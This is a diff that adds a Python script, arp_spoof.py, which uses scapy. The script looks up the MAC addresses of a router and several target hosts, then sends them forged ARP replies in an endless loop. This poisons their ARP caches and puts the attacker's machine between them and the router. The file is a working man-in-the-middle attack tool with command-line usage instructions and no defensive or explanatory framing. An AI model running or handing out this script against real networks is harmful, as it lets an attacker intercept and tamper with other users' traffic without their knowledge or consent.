@@ -1,0 +1,46 @@
+import scapy.all as scapy
+import sys
+import time
+
+
+def get_mac_address(ip_address):
+    broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
+    arp_layer = scapy.ARP(pdst=ip_address)
+    get_mac_packet = broadcast_layer / arp_layer
+    answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
+    return answer[0][1].hwsrc
+
+
+def spoof(router_ip, target_ip, router_mac, target_mac):
+    packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
+    packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)
+    scapy.send(packet1)
+    scapy.send(packet2)
+
+
+def spoof_multiple(router_ip, target_ips):
+    try:
+        router_mac = get_mac_address(router_ip)
+        target_macs = {ip: get_mac_address(ip) for ip in target_ips}
+
+        print(f"Router MAC Address: {router_mac}")
+        for ip, mac in target_macs.items():
+            print(f"Target {ip} MAC Address: {mac}")
+
+        while True:
+            for target_ip, target_mac in target_macs.items():
+                spoof(router_ip, target_ip, router_mac, target_mac)
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("Exiting Spoof Script")
+        exit(0)
+
+
+if __name__ == "__main__":
+    if len(sys.argv) < 3:
+        print("Usage: python arp_spoof.py <router_ip> <target_ip1> <target_ip2> ... <target_ipN>")
+        sys.exit(1)
+
+    router_ip = sys.argv[1]
+    target_ips = sys.argv[2:]
+    spoof_multiple(router_ip, target_ips)
